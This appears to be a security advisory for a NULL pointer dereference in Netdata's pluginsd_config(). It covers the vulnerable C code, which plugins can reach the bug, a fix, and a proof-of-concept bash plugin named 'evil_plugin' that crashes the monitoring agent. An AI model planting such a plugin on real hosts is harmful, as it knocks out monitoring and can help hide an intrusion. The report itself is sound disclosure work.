# Bug #2: NULL Pointer Dereference in `pluginsd_config()` — Plugin Protocol DoS

## Summary

A NULL pointer dereference in `pluginsd_config()` allows any Netdata plugin (local or Go/Python collector) to crash the parent agent by sending a `CONFIG <id>` command without an action argument. The `get_word()` call returns NULL for the missing action parameter, and the subsequent `strcmp(NULL, ...)` triggers a SIGSEGV, immediately killing the Netdata process.

**Severity:** Medium (CVSS ~6.5) — requires local plugin access, not remotely exploitable over streaming.

## Details

### Vulnerable Code (`src/plugins.d/pluginsd_dyncfg.c:8-18`)

```c
PARSER_RC pluginsd_config(char **words, size_t num_words, PARSER *parser) {
    RRDHOST *host = localhost;
    if(!host) return PARSER_RC_ERROR;

    size_t i = 1;
    char *id     = get_word(words, num_words, i++);  // word[1] — may be present
    char *action = get_word(words, num_words, i++);  // word[2] — NULL if only 2 words

    if(strcmp(action, PLUGINSD_KEYWORD_CONFIG_ACTION_CREATE) == 0) {  // ← CRASH: strcmp(NULL, ...)
```

When a plugin sends `CONFIG myid\n` (no action argument), `get_word(words, num_words, 2)` returns NULL because `num_words` is only 2 (the command `CONFIG` + the id `myid`). The code then calls `strcmp(NULL, "create")` which dereferences the NULL pointer.

### Contrast with Other Commands

Other commands in the same codebase properly check for NULL before using `strcmp`:

- `pluginsd_json()` (line 1249): `if(!keyword || !*keyword) { ... return PARSER_RC_OK; }`
- `pluginsd_function()` (line 324): `if(num_words >= 2 && strcmp(get_word(...), "GLOBAL") == 0)`
- `dyncfg-intercept.c` (line 320): `if(!config || !*config || strcmp(...) != 0)`

The `pluginsd_config()` function lacks this guard.

### Attack Surface

The `CONFIG` command is registered with `PARSER_INIT_PLUGINSD` repertoire only (not `PARSER_INIT_STREAMING`), meaning it is:

- **Reachable from:** Local plugins (go.d.plugin, python.d.plugin, apps.plugin, ebpf.plugin, etc.)
- **NOT reachable from:** Remote streaming children (not in PARSER_INIT_STREAMING)

This limits the attack to:
1. A compromised/malicious plugin running on the same host
2. A bug in a collector that accidentally sends a malformed CONFIG command
3. An attacker who has achieved local code execution and wants to kill monitoring

## PoC

### Trigger via Plugin Protocol

Any Netdata plugin communicates with the parent via stdin/stdout pipes using the pluginsd text protocol. To trigger this bug, a plugin simply writes:

```
CONFIG myid
```

(Note: no action argument after the id)

### Minimal Reproduction

1. Create a test plugin script:

```bash
#!/bin/bash
# Save as /usr/libexec/netdata/plugins.d/evil_plugin
echo "CONFIG testid"
sleep 999
```

2. Make it executable and add to Netdata's plugin directory:

```bash
chmod +x /usr/libexec/netdata/plugins.d/evil_plugin
```

3. Restart Netdata — the plugin will be auto-loaded and immediately crash the agent.

### Alternative: Using an Existing Plugin's stderr/communication Channel

If an attacker has compromised any Go or Python collector (which runs as a separate process communicating over the pluginsd protocol), they can inject this single-line payload to crash the parent.

## Impact

- **Type:** NULL Pointer Dereference (CWE-476) → Denial of Service
- **Who is impacted:** Any Netdata deployment where a local plugin can send malformed protocol commands. This includes:
  - Deployments with custom plugins
  - Environments where an attacker has compromised any collector subprocess
  - Fuzzing/testing scenarios
- **Severity:** Medium. Requires local access (plugin-level), not remotely exploitable over streaming. However, the crash is immediate and deterministic.
- **Availability impact:** The entire Netdata agent process crashes (SIGSEGV), killing all monitoring for that host.

## Suggested Fix

Add a NULL/empty-string guard before the `strcmp` calls:

```c
PARSER_RC pluginsd_config(char **words, size_t num_words, PARSER *parser) {
    RRDHOST *host = localhost;
    if(!host) return PARSER_RC_ERROR;

    size_t i = 1;
    char *id     = get_word(words, num_words, i++);
    char *action = get_word(words, num_words, i++);

    // ADD THIS GUARD:
    if(!id || !*id || !action || !*action) {
        nd_log(NDLS_COLLECTORS, NDLP_WARNING,
               "DYNCFG: CONFIG command received without required parameters (id='%s', action='%s')",
               id ? id : "(null)", action ? action : "(null)");
        return PARSER_RC_ERROR;
    }

    if(strcmp(action, PLUGINSD_KEYWORD_CONFIG_ACTION_CREATE) == 0) {
        ...
```

## Source Code References

| File | Line | Issue |
|------|------|-------|
| `src/plugins.d/pluginsd_dyncfg.c` | 17 | `strcmp(action, ...)` without NULL check |
| `src/plugins.d/pluginsd_dyncfg.c` | 15 | `get_word(words, num_words, 2)` can return NULL |
| `src/plugins.d/gperf-config.txt` | 91 | CONFIG registered as `PARSER_INIT_PLUGINSD` only |
